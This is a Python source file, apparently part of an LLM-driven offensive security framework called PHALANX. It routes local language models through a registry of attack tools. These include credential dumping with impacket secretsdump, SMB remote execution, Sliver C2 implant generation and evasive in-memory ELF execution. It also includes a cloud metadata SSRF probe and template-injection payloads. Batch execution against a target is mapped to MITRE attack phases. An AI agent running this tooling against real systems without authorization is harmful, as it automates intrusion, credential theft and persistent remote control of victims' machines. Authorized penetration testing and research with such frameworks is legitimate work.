        result["error"] = "Ghidra not installed and basic analysis limited. Install Ghidra: sudo apt install ghidra"

    return result

# ------------------------------------------------------------------
# New tools: cloud metadata probe and template injection test
# ------------------------------------------------------------------
def run_cloud_metadata_probe(target: str, timeout=30, config=None) -> Dict:
    """Test common SSRF/cloud metadata endpoints."""
    urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/"
    ]
    results = {}
    for url in urls:
        res = _execute_in_sandbox(["curl", "-s", "-m", "5", url], timeout, config=config)
        results[url] = res["output"][:200]
    output = json.dumps(results, indent=2)
    return {"tool": "cloud_metadata_probe", "target": target, "output": output, "rc": 0}

def run_template_injection_test(target: str, timeout=60, config=None) -> Dict:
    """Basic template injection probe using common payloads."""
    payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}"]
    results = {}
    for payload in payloads:
        # Try to inject into URL parameters (simplistic)
        test_url = f"{target}?test={payload}"
        res = _execute_in_sandbox(["curl", "-s", test_url], timeout, config=config)
        if "49" in res["output"] or "49" in res.get("error", ""):
            results[payload] = "Potential injection detected"
        else:
            results[payload] = "No immediate eval"
    output = json.dumps(results, indent=2)
    return {"tool": "template_injection_test", "target": target, "output": output, "rc": 0}

# ------------------------------------------------------------------
# Helper functions for impacket tools
# ------------------------------------------------------------------
def _impacket_secretsdump_wrapper(target: str, args="", config=None):
    return run_impacket(target, "secretsdump", args, config=config)

def _impacket_smbexec_wrapper(target: str, args="", config=None):
    return run_impacket(target, "smbexec", args, config=config)

# ------------------------------------------------------------------
# Tool registry with parser functions (thread-safe)
# ------------------------------------------------------------------
_TOOL_REGISTRY_LOCK = threading.RLock()
TOOL_REGISTRY: Dict[str, Dict] = {}
SKILL_REGISTRY: Dict[str, Dict] = {}

def _init_registries():
    with _TOOL_REGISTRY_LOCK:
        if TOOL_REGISTRY:
            return
        registry_entries = {
            "nmap":           {"fn": run_nmap,           "desc": "Full port scan", "tags": ["recon", "network"], "parser": parse_nmap_output},
            "nmap_quick":     {"fn": run_nmap_quick,     "desc": "Fast top-1000 scan", "tags": ["recon", "network"], "parser": parse_nmap_output},
            "whois":          {"fn": run_whois,          "desc": "WHOIS lookup", "tags": ["recon", "osint"]},
            "dig":            {"fn": run_dig,            "desc": "DNS lookup", "tags": ["recon", "dns"]},
            "subfinder":      {"fn": run_subfinder,      "desc": "Subdomain enumeration", "tags": ["recon", "dns"], "parser": parse_subfinder_output},
            "theharvester":   {"fn": run_theharvester,   "desc": "Email/domain OSINT", "tags": ["osint"]},
            "enum4linux":     {"fn": run_enum4linux,     "desc": "SMB enumeration", "tags": ["recon", "smb"]},
            "httpx":          {"fn": run_httpx,          "desc": "Live host probing", "tags": ["recon", "web"], "parser": parse_httpx_output},
            "nuclei":         {"fn": run_nuclei,         "desc": "Vulnerability scanner", "tags": ["recon", "vuln"], "parser": parse_nuclei_output},
            "naabu":          {"fn": run_naabu,          "desc": "Fast port scanner", "tags": ["recon", "network"], "parser": parse_naabu_output},
            "katana":         {"fn": run_katana,         "desc": "Web crawler", "tags": ["recon", "web"]},
            "dnsx":           {"fn": run_dnsx,           "desc": "DNS enumeration", "tags": ["recon", "dns"]},
            "gau":            {"fn": run_gau,            "desc": "Passive URL gathering", "tags": ["recon", "osint"]},
            "nikto":          {"fn": run_nikto,          "desc": "Web vulnerability scanner", "tags": ["web", "vuln"]},
            "whatweb":        {"fn": run_whatweb,        "desc": "Web technology fingerprint", "tags": ["web", "recon"]},
            "gobuster":       {"fn": run_gobuster,       "desc": "Directory brute‑force", "tags": ["web", "bruteforce"]},
            "ffuf":           {"fn": run_ffuf,           "desc": "Web fuzzing", "tags": ["web", "bruteforce"]},
            "wpscan":         {"fn": run_wpscan,         "desc": "WordPress scanner", "tags": ["web", "cms"]},
            "scrape":         {"fn": run_scrape,         "desc": "Web scraping (emails, links)", "tags": ["web", "osint"], "parser": parse_scrape_output},
            "sqlmap":         {"fn": run_sqlmap,         "desc": "Full SQL injection", "tags": ["exploit", "sqli"], "parser": parse_sqlmap_output},
            "sqlmap_detect":  {"fn": run_sqlmap_detect,  "desc": "SQLi detection (safe)", "tags": ["exploit", "sqli"], "parser": parse_sqlmap_output},
            "msfconsole":     {"fn": run_msfconsole,     "desc": "Metasploit resource script", "tags": ["exploit", "framework"]},
            "searchsploit":   {"fn": run_searchsploit,   "desc": "Exploit database search", "tags": ["exploit"]},
            "impacket_secretsdump": {"fn": _impacket_secretsdump_wrapper, "desc": "Dump credentials", "tags": ["post", "creds"]},
            "impacket_smbexec":     {"fn": _impacket_smbexec_wrapper, "desc": "SMB command exec", "tags": ["post", "smb"]},
            "sliver_generate": {"fn": run_sliver_generate, "desc": "Generate Sliver implant", "tags": ["c2"]},
            "sliver_sessions": {"fn": run_sliver_sessions, "desc": "List Sliver sessions", "tags": ["c2"]},
            "stealth_rce":    {"fn": run_stealth_rce,    "desc": "In‑memory ELF execution", "tags": ["exploit", "evasion"]},
            "copyright_osint": {"fn": run_copyright_osint, "desc": "Copyright OSINT scan", "tags": ["osint", "compliance"]},
            "burp_scan":      {"fn": run_burp_scan,      "desc": "Burp Suite scan", "tags": ["web", "vuln"]},
            "ghidra_analyze": {"fn": run_ghidra_analyze, "desc": "Ghidra binary analysis", "tags": ["recon", "binary"], "parser": parse_ghidra_output},
            "cloud_metadata_probe": {"fn": run_cloud_metadata_probe, "desc": "Cloud metadata SSRF probe", "tags": ["recon", "ssrf"]},
            "template_injection_test": {"fn": run_template_injection_test, "desc": "Template injection probe", "tags": ["exploit", "ssti"]},
        }
        TOOL_REGISTRY.update(registry_entries)

        skill_entries = {
            "nmap":           {"phase": "recon", "mitre": ["T1595", "T1046"], "desc": "Port scanning"},
            "nmap_quick":     {"phase": "recon", "mitre": ["T1595"], "desc": "Fast port scan"},
            "whois":          {"phase": "recon", "mitre": ["T1591"], "desc": "WHOIS lookup"},
            "dig":            {"phase": "recon", "mitre": ["T1590.002"], "desc": "DNS enumeration"},
            "subfinder":      {"phase": "recon", "mitre": ["T1590.002"], "desc": "Subdomain discovery"},
            "theharvester":   {"phase": "recon", "mitre": ["T1591"], "desc": "Email/domain OSINT"},
            "enum4linux":     {"phase": "recon", "mitre": ["T1590.005"], "desc": "SMB enumeration"},
            "httpx":          {"phase": "recon", "mitre": ["T1595.002"], "desc": "Live host probing"},
            "nuclei":         {"phase": "recon", "mitre": ["T1595.002"], "desc": "Vulnerability scanning"},
            "naabu":          {"phase": "recon", "mitre": ["T1046"], "desc": "Fast port scanner"},
            "katana":         {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web crawler"},
            "dnsx":           {"phase": "recon", "mitre": ["T1590.002"], "desc": "DNS enumeration"},
            "gau":            {"phase": "recon", "mitre": ["T1595.002"], "desc": "Passive URL gathering"},
            "nikto":          {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web vuln scanner"},
            "whatweb":        {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web technology fingerprint"},
            "gobuster":       {"phase": "recon", "mitre": ["T1595.002"], "desc": "Directory brute‑force"},
            "ffuf":           {"phase": "recon", "mitre": ["T1595.002"], "desc": "Web fuzzing"},
            "wpscan":         {"phase": "recon", "mitre": ["T1595.002"], "desc": "WordPress scanner"},
            "scrape":         {"phase": "recon", "mitre": ["T1593"], "desc": "Web scraping"},
            "sqlmap":         {"phase": "exploit", "mitre": ["T1190"], "desc": "SQL injection"},
            "sqlmap_detect":  {"phase": "exploit", "mitre": ["T1190"], "desc": "SQLi detection"},
            "msfconsole":     {"phase": "exploit", "mitre": ["T1190", "T1210"], "desc": "Metasploit"},
            "searchsploit":   {"phase": "exploit", "mitre": ["T1588.005"], "desc": "Exploit database search"},
            "impacket_secretsdump": {"phase": "post", "mitre": ["T1003"], "desc": "Dump credentials"},
            "impacket_smbexec":     {"phase": "post", "mitre": ["T1021.002"], "desc": "SMB command execution"},
            "sliver_generate":      {"phase": "post", "mitre": ["T1587.001"], "desc": "Generate C2 implant"},
            "sliver_sessions":      {"phase": "post", "mitre": ["T1059"], "desc": "List C2 sessions"},
            "stealth_rce":          {"phase": "post", "mitre": ["T1059", "T1106"], "desc": "Memory‑only execution"},
            "copyright_osint":      {"phase": "osint", "mitre": ["T1592", "T1593"], "desc": "Copyright OSINT"},
            "burp_scan":            {"phase": "vuln", "mitre": ["T1190"], "desc": "Burp vulnerability scan"},
            "ghidra_analyze":       {"phase": "recon", "mitre": ["T1592"], "desc": "Binary analysis"},
            "cloud_metadata_probe": {"phase": "recon", "mitre": ["T1557"], "desc": "Cloud metadata SSRF probe"},
            "template_injection_test": {"phase": "exploit", "mitre": ["T1190"], "desc": "Template injection probe"},
        }
        SKILL_REGISTRY.update(skill_entries)

_init_registries()

def list_tools() -> List[Dict]:
    with _TOOL_REGISTRY_LOCK:
        return [{"name": k, "desc": v["desc"], "tags": v["tags"], "phase": SKILL_REGISTRY.get(k, {}).get("phase", "unknown")} for k, v in TOOL_REGISTRY.items()]

def get_skill_metadata(tool_name: str) -> Dict:
    with _TOOL_REGISTRY_LOCK:
        return SKILL_REGISTRY.get(tool_name, {})

def run_tool(tool_name: str, config: Optional[dict] = None, parse_output: bool = True, **kwargs) -> Dict:
    with _TOOL_REGISTRY_LOCK:
        entry = TOOL_REGISTRY.get(tool_name)
    if not entry:
        return {"tool": tool_name, "output": "", "parsed": {}, "error": f"Unknown tool: {tool_name}", "rc": -1}
    try:
        fn = entry["fn"]
        sig = inspect.signature(fn)
        if "config" in sig.parameters:
            result = fn(**kwargs, config=config)
        else:
            result = fn(**kwargs)
        if parse_output and "parser" in entry and entry["parser"]:
            try:
                parsed = entry["parser"](result.get("output", ""), kwargs)
                result["parsed_structured"] = parsed
            except Exception as e:
                logger.warning(f"Parser failed for {tool_name}: {e}")
        return result
    except TypeError as e:
        return {"tool": tool_name, "output": "", "parsed": {}, "error": f"Bad arguments: {e}", "rc": -1}

def run_swarm_tool_batch(tool_list: List[str], target: str, config: Optional[dict] = None) -> Dict[str, Dict]:
    results = {}
    def _run_one(tool):
        try:
            return tool, run_tool(tool, config=config, target=target)
        except Exception as e:
            return tool, {"error": str(e), "rc": -1}
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {executor.submit(_run_one, tool): tool for tool in tool_list}
        for future in as_completed(futures):
            tool, res = future.result()
            results[tool] = res
    return results

# ------------------------------------------------------------------
# Lightweight RAG Tool Optimizer (embedding cache + similarity retrieval)
# ------------------------------------------------------------------
_TOOL_EMBEDDING_CACHE: Dict[str, List[float]] = {}
_EMBEDDING_CACHE_LOCK = threading.RLock()
_EMBEDDING_MODEL = "nomic-embed-text"

def _get_embedding(text: str, gateway: Optional["Gateway"] = None) -> Optional[List[float]]:
    if gateway is not None and hasattr(gateway, "get_embedding"):
        try:
            return gateway.get_embedding(text)
        except Exception as e:
            logger.warning(f"Gateway embedding failed: {e}, falling back to direct Ollama")
    ollama_url = "http://localhost:11434"
    if gateway is not None and hasattr(gateway, "ollama_url"):
        ollama_url = gateway.ollama_url
    try:
        resp = requests.post(f"{ollama_url}/api/embeddings", json={"model": _EMBEDDING_MODEL, "prompt": text}, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("embedding")
    except Exception as e:
        logger.warning(f"Direct embedding request failed: {e}")
    return None

def _cosine_similarity(a: List[float], b: List[float]) -> float:
    dot = sum(x*y for x,y in zip(a,b))
    norm_a = sum(x*x for x in a)**0.5
    norm_b = sum(y*y for y in b)**0.5
    if norm_a == 0 or norm_b == 0:
        return 0.0
    return dot / (norm_a * norm_b)

def get_relevant_tools(query: str, gateway: Optional["Gateway"] = None, top_k: int = 20) -> List[Dict]:
    tools = list_tools()
    if len(tools) <= top_k:
        return tools

    query_emb = _get_embedding(query, gateway)
    if query_emb is None:
        query_words = set(query.lower().split())
        scored = []
        for t in tools:
            text = (t["name"] + " " + t["desc"]).lower()
            score = sum(1 for w in query_words if w in text)
            scored.append((score, t))
        scored.sort(key=lambda x: x[0], reverse=True)
        return [t for _, t in scored[:top_k]]

    tool_texts = []
    tool_embs = []
    with _EMBEDDING_CACHE_LOCK:
        for t in tools:
            key = t["name"]
            if key in _TOOL_EMBEDDING_CACHE:
                emb = _TOOL_EMBEDDING_CACHE[key]
            else:
                text = f"{t['name']}: {t['desc']} (phase: {t.get('phase','unknown')}, tags: {', '.join(t.get('tags',[]))})"
                emb = _get_embedding(text, gateway)
                if emb:
                    _TOOL_EMBEDDING_CACHE[key] = emb
                else:
                    emb = [0.0] * len(query_emb) if query_emb else []
            if emb and len(emb) == len(query_emb):
                tool_texts.append(t)
                tool_embs.append(emb)

    if not tool_embs:
        return tools[:top_k]

    similarities = []
    for i, emb in enumerate(tool_embs):
        sim = _cosine_similarity(query_emb, emb)
        similarities.append((sim, tool_texts[i]))
    similarities.sort(key=lambda x: x[0], reverse=True)
    return [t for _, t in similarities[:top_k]]

# ------------------------------------------------------------------
# MCP Compatibility Layer (Model Context Protocol)
# ------------------------------------------------------------------
_MCP_SERVERS: Dict[str, Dict] = {}
_MCP_SERVERS_LOCK = threading.RLock()

def _make_mcp_wrapper(server_name: str, tool_name: str):
    def wrapper(**kwargs):
        return run_mcp_tool(server_name, tool_name, kwargs)
    return wrapper

def register_mcp_tool_server(server_url: str, server_name: Optional[str] = None) -> bool:
    if not server_name:
        server_name = server_url.replace("https://", "").replace("http://", "").split("/")[0]
        server_name = f"mcp_{server_name}"
    try:
        resp = requests.get(f"{server_url}/tools", timeout=10)
        if resp.status_code != 200:
            logger.error(f"MCP server {server_url} returned {resp.status_code}")
            return False
        data = resp.json()
        tools = data.get("tools", [])
        if not tools:
            logger.warning(f"No tools found at {server_url}/tools")
            return False

        with _MCP_SERVERS_LOCK:
            _MCP_SERVERS[server_name] = {"url": server_url, "tools": tools}

        with _TOOL_REGISTRY_LOCK:
            for tool in tools:
                tool_full_name = f"{server_name}__{tool['name']}"
                if tool_full_name in TOOL_REGISTRY:
                    logger.warning(f"Tool {tool_full_name} already exists, overwriting")
                TOOL_REGISTRY[tool_full_name] = {
                    "fn": _make_mcp_wrapper(server_name, tool['name']),
                    "desc": tool.get("description", f"MCP tool from {server_name}"),
                    "tags": ["mcp"],
                    "parser": None,
                }
                SKILL_REGISTRY[tool_full_name] = {"phase": "mcp", "mitre": [], "desc": tool.get("description", "")}
        logger.info(f"Registered {len(tools)} MCP tools from {server_name}")
        return True
    except Exception as e:
        logger.error(f"Failed to register MCP server {server_url}: {e}")
        return False

def run_mcp_tool(server_name: str, tool_name: str, params: Dict) -> Dict:
    with _MCP_SERVERS_LOCK:
        server = _MCP_SERVERS.get(server_name)
    if not server:
        return {"output": "", "error": f"MCP server '{server_name}' not registered", "rc": -1}
    url = server["url"]
    try:
        resp = requests.post(f"{url}/call", json={"tool": tool_name, "params": params}, timeout=60)
        if resp.status_code == 200:
            result = resp.json()
            output = result.get("output", result.get("result", result.get("stdout", "")))
            error = result.get("error")
            rc = result.get("rc", 0)
            return {"output": output, "error": error, "rc": rc}
        else:
            return {"output": "", "error": f"MCP server returned {resp.status_code}: {resp.text}", "rc": -1}
    except Exception as e:
        return {"output": "", "error": f"MCP execution failed: {e}", "rc": -1}

# ------------------------------------------------------------------
# Gateway – unified interface for LLM and tool execution with model routing
# ------------------------------------------------------------------
class Gateway:
    PROFILES = {
        "eco": {"orchestrator": "qwen2.5:7b", "planner": "qwen2.5:7b", "recon": "qwen2.5:1.5b",
                "exploit": "qwen2.5:7b", "post_exploit": "qwen2.5:7b"},
        "max": {"orchestrator": "llama3:70b", "planner": "llama3:70b", "recon": "llama3:70b",
                "exploit": "llama3:70b", "post_exploit": "llama3:70b"},
        "test": {"orchestrator": "qwen2.5:1.5b", "planner": "qwen2.5:1.5b", "recon": "qwen2.5:1.5b",
                 "exploit": "qwen2.5:1.5b", "post_exploit": "qwen2.5:1.5b"},
    }

    def __init__(self, config: dict, registry: Dict[str, Callable] = None):
        self.config = config
        self.registry = registry or TOOL_REGISTRY
        oc = config.get("ollama", {})
        self.ollama_url = oc.get("url", "http://localhost:11434")
        self.default_model = oc.get("default_model", "qwen2.5:7b")
        self.fast_model = oc.get("fast_model", "qwen2.5:1.5b")
        self.reasoning_model = oc.get("reasoning_model", self.default_model)
        self.temperature = oc.get("temperature", 0.1)
        self.timeout = oc.get("timeout", 120)
        self.current_profile = "test"
        self.current_personality = "concise"
        self.personality_prompts = {
            "concise": "Be brief and direct. Max 3 sentences.",
            "detailed": "Provide detailed step‑by‑step explanations.",
            "code": "Focus on working code and technical accuracy.",
            "pentest": "You are a penetration tester. Give technical offensive security answers."
        }
        set_global_config(config)

        mcp_cfg = config.get("mcp", {})
        if mcp_cfg.get("enabled", False):
            for server in mcp_cfg.get("servers", []):
                name = server.get("name")
                url = server.get("url")
                if name and url:
                    register_mcp_tool_server(url, server_name=name)
                    logger.info(f"Auto-registered MCP server '{name}' from config")

    def get_model_for_task(self, task_type: str) -> str:
        if task_type == "reason":
            return self.reasoning_model
        elif task_type == "parse":
            return self.fast_model
        else:
            return self.default_model

    def get_ollama_models(self) -> List[str]:
        try:
            result = subprocess.run(["ollama", "list", "--json"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                data = json.loads(result.stdout)
                return [m["name"] for m in data.get("models", [])]
            else:
                result = subprocess.run(["ollama", "list"], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    lines = result.stdout.strip().splitlines()
                    if len(lines) > 1:
                        models = []
                        for line in lines[1:]:
                            parts = line.split()
                            if parts:
                                models.append(parts[0])
                        return models
        except Exception as e:
            logger.warning(f"Failed to list Ollama models: {e}")
        return []

    def pull_ollama_model(self, model: str) -> bool:
        try:
            subprocess.run(["ollama", "pull", model], check=True, timeout=300)
            return True
        except Exception as e:
            logger.error(f"Failed to pull model {model}: {e}")
            return False

    def get_model_for_agent(self, agent_name: str) -> str:
        profile = self.PROFILES.get(self.current_profile, self.PROFILES.get("test", {}))
        return profile.get(agent_name, self.default_model)

    def set_profile(self, name: str):
        if name in self.PROFILES:
            self.current_profile = name
        else:
            logger.warning(f"Profile '{name}' not found, keeping '{self.current_profile}'")

    def set_model(self, model: str):
        self.default_model = model

    def set_personality(self, personality: str):
        if personality in self.personality_prompts:
            self.current_personality = personality

    def check_ollama(self) -> bool:
        try:
            r = requests.get(f"{self.ollama_url}/api/tags", timeout=3)
            return r.status_code == 200
        except:
            return False

    def list_models(self) -> List[str]:
        try:
            r = requests.get(f"{self.ollama_url}/api/tags", timeout=5)
            if r.status_code == 200:
                return [m["name"] for m in r.json().get("models", [])]
        except:
            pass
        return [self.default_model]

    def stream_generate(self, prompt: str, model=None, system=None) -> Iterator[Dict]:
        model = model or self.default_model
        personality = self.personality_prompts.get(self.current_personality, "")
        full_system = " ".join(filter(None, [system or "You are a helpful AI assistant.", personality]))
        payload = {"model": model, "prompt": prompt, "system": full_system, "stream": True, "options": {"temperature": self.temperature}}
        try:
            with requests.post(f"{self.ollama_url}/api/generate", json=payload, stream=True, timeout=self.timeout) as r:
                for line in r.iter_lines():
                    if line:
                        try:
                            data = json.loads(line)
                            yield data
                            if data.get("done"):
                                break
                        except:
                            pass
        except Exception as e:
            yield {"response": f"[Gateway error: {e}]", "done": True}

    def chat(self, messages: List[Dict], model=None, json_mode=False, retries=2) -> str:
        model = model or self.default_model
        personality = self.personality_prompts.get(self.current_personality, "")
        system_present = any(m.get("role") == "system" for m in messages)
        if not system_present and personality:
            messages.insert(0, {"role": "system", "content": personality})
        payload = {"model": model, "messages": messages, "stream": False, "options": {"temperature": self.temperature}}
        if json_mode:
            payload["format"] = "json"
        for attempt in range(retries):
            try:
                r = requests.post(f"{self.ollama_url}/api/chat", json=payload, timeout=self.timeout)
                if r.status_code == 200:
                    content = r.json()["message"]["content"]
                    if json_mode:
                        content = content.strip()
                        if content.startswith("```json"):
                            content = content[7:]
                        if content.endswith("```"):
                            content = content[:-3]
                        content = content.strip()
                        json.loads(content)
                    return content
                else:
                    if attempt == retries-1:
                        return f"[Error: Ollama HTTP {r.status_code}]"
            except Exception as e:
                if attempt == retries-1:
                    return f"[Gateway error: {e}]"
            time.sleep(1)
        return "[Gateway error: max retries exceeded]"

    def generate(self, prompt: str, model=None, system=None, json_mode=False) -> str:
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": prompt})
        return self.chat(messages, model=model, json_mode=json_mode)

    def run_tool(self, tool_name: str, params: Dict, parse_output: bool = True) -> Dict:
        if tool_name not in self.registry:
            return {"error": f"Unknown tool: {tool_name}"}
        logger.info(f"Running tool: {tool_name} with params {params}")
        try:
            result = self.registry[tool_name]["fn"](**params, config=self.config)
            if "output" not in result:
                result["output"] = result.get("stdout", "")
            if "rc" not in result:
                result["rc"] = result.get("returncode", -1)
            if parse_output and "parser" in self.registry[tool_name]:
                try:
                    parsed = self.registry[tool_name]["parser"](result.get("output", ""), params)
                    result["parsed_structured"] = parsed
                except Exception as e:
                    logger.warning(f"Parser failed for {tool_name}: {e}")
            return result
        except Exception as e:
            logger.exception(f"Tool {tool_name} failed")
            return {"error": str(e), "rc": -1}

    def get_tool_list_for_llm(self) -> str:
        tools = list_tools()
        if len(tools) > 80:
            phases = {}
            for t in tools:
                phase = t.get("phase", "unknown")
                if phase not in phases:
                    phases[phase] = []
                phases[phase].append(t["name"])
            lines = []
            for phase, names in phases.items():
                lines.append(f"### {phase.upper()} phase: {', '.join(names[:20])}" + (" ..." if len(names) > 20 else ""))
            return "\n".join(lines)
        else:
            lines = []
            for t in tools:
                lines.append(f"- {t['name']}: {t['desc']} (phase: {t.get('phase', 'unknown')})")
            return "\n".join(lines)

    def get_relevant_tools(self, query: str, top_k: int = 20) -> str:
        relevant = get_relevant_tools(query, gateway=self, top_k=top_k)
        lines = []
        for t in relevant:
            lines.append(f"- {t['name']}: {t['desc']} (phase: {t.get('phase', 'unknown')})")
        return "\n".join(lines)

    def get_mitre_technique(self, technique_id: str) -> str:
        cache = {
            "T1190": "Exploit Public-Facing Application",
            "T1046": "Network Service Scanning",
            "T1595": "Active Scanning",
        }
        return cache.get(technique_id.upper(), "Unknown technique")

def get_llm_gateway(config: dict):
    try:
        agents_dir = Path.cwd() / "phalanx" / "agents"
        if agents_dir.exists() and str(agents_dir) not in sys.path:
            sys.path.insert(0, str(agents_dir))
        from llm_gateway import OllamaGateway
        return OllamaGateway(config)
    except ImportError:
        logger.warning("OllamaGateway not found – using fallback Gateway")
        return Gateway(config, TOOL_REGISTRY)

def run_tool_sandboxed(tool_name: str, config: dict, **kwargs) -> Dict:
    return run_tool(tool_name, config=config, **kwargs)

def get_tool_list_for_llm() -> str:
    return Gateway({}, TOOL_REGISTRY).get_tool_list_for_llm()

if __name__ == "__main__":
    print("PHALANX Tools v3.3 ready (SWARM tools included).")
    print("Available tools:", [t["name"] for t in list_tools()])
    cfg = {"sandbox": {"enabled": False}}
    res = run_nmap("localhost", config=cfg)
    print(f"nmap test: rc={res['rc']}")
